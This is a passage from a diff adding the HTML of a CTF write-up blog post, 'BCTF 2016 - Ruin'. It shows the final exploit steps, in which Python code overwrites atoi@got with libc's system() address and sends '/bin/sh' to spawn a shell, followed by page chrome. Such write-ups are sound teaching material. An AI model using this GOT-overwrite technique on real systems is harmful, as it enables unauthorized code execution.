+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;Got libc_system: </span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">libc_system</span><span class="p">)</span>
+</code></pre></div>
+
+<p>And to complete the exploitation, all we must do is overwrite again <code>atoi@got</code>
+with the address of <code>system()</code>, and when <code>fgets()</code> will be triggered, simply
+enter the command we want to execute, in this case <code>/bin/sh</code> will do:</p>
+<div class="highlight"><pre><span></span><code>    <span class="n">update_key</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">libc_system</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+    <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;atoi@got: </span><span class="si">%#x</span><span class="s2"> -&gt; </span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">ATOI_GOT</span><span class="p">,</span> <span class="n">libc_system</span><span class="p">))</span>
+
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>The exploit is complete, we can run it:
+<img alt="image_alt" src="https://i.imgur.com/Ei1aeLb.png"></p>
+<p>And as always, go <a href="https://gist.github.com/hugsy/187f7dd80cb5bff20842">here</a> for
+the full exploit.</p>
+<p>Peace out ✌</p>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=BCTF 2016 - Ruin&amp;url=https://blahcat.github.io/posts/2016/03/21/bctf-2016-ruin.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2016/03/21/bctf-2016-ruin.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2016/03/21/bctf-2016-ruin.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/pwn">pwn</a><a href="https://blahcat.github.io/tag/gef">gef</a><a href="https://blahcat.github.io/tag/bctf-2016">bctf-2016</a><a href="https://blahcat.github.io/tag/arm">arm</a><a href="https://blahcat.github.io/tag/heap-overflow">heap-overflow</a><a href="https://blahcat.github.io/tag/format-string">format-string</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/ctf">ctf</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=BCTF 2016 - Ruin">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2016/03/28/volgactf-2016-web-of-science.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">VolgaCTF 2016 - Web of Science</h2>
+                            <p class="post-nav-excerpt">Info gef➤ !file ./web_of_science ./web_of_science: ELF 64-bit LSB executable, x86-64,...</p>
+                        </section>
+                    </a>
+                    <a class="post-nav-prev" href="https://blahcat.github.io/posts/2016/03/14/0ctf-2016-warmup-write-up.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-right"></i>
+                                <h2 class="post-nav-title">0ctf 2016 - Warmup write-up</h2>
+                            <p class="post-nav-excerpt">I participated to 0ctf but only had time to play for the reversing challenge trace...</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
